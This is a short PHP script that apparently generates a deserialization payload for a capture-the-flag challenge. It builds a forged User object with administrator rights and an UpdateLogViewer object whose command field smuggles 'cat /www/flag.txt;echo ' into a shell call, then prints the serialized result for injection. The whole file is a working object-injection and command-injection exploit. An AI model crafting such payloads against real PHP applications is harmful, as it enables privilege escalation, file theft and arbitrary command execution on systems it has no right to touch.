<?php


class User
{
    public $name = 'Anon';
    public $isAdmin = True;
    public $id = 'a626f9d074d5bb5f5210b8b881078111027ff8f5';
}

class UpdateLogViewer
{
    public string $packgeName;
    public string $logCmdReader;
    private static ?UpdateLogViewer $singleton = null;
    
    public function __construct(string $packgeName)
    {
        $this->packgeName = $packgeName;
        $this->logCmdReader = 'cat /www/flag.txt;echo ';
    }
};

$a = new User();
$b = new UpdateLogViewer("test");

echo(serialize([$a,$b])).PHP_EOL;